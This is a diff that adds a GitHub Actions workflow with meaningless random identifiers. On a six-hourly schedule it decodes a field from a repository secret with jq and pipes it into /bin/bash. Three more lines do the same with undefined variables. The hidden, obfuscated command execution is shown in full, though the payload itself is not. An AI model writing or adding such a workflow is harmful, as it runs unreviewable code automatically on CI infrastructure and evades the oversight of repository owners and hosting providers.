@@ -1,0 +1,21 @@
+name: zebrajourney
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '2 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zebrajourney
+        env:
+          uwewt95728: ${{ secrets.uwewt95728 }}
+        run: |
+          echo $uwewt95728 | jq -r .kjel3241 | /bin/bash
+          echo $smts18639 | jq -r .vovyw29626 | /bin/bash
+          echo $twtmo76784 | jq -r .hqvza84697 | /bin/bash
+          echo $qvla8 | jq -r .za713 | /bin/bash
+
